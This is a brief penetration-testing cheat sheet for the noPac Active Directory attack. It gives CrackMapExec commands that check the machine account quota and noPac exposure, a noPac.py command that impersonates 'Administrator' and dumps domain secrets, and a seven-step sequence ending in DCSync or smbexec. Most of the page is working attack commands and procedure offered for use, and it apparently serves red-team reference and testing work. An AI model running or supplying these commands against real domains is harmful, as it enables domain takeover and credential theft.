# Nopac

## Checker

Check the domain's ms-DS-MachineAccountQuota attribute:

```text
cme ldap [DC FQDN] -u [USER] -p [PASSWORD] -d [DOMAIN] -M maq 
```

Check for noPAC:

```text
smb 192.168.56.11 -u [USER] -p [PASSWORD] -M nopac
```

## Exploitation 

```text
noPac.py 
[DOMAIN/USER:PASSWORD] -dc-ip [DC IP] --impersonate "Administrator" -dump
```

With python: <https://github.com/Ridter/noPac>

With Rubeus: <https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware>

### Exploitation steps

1/ Add a new computer

2/ Clear the SPNs of our new computer (with dirkjan krbrelayx tool addspn)

3/ Rename the computer (computer -> DC)

4/ Obtain a TGT

5/ Reset the computer name back to the original name

6/ Obtain a service ticket with S4U2self by presenting the previous TGT

7/ DCSync, smbexec, etc. by presenting the “Administrator” ST
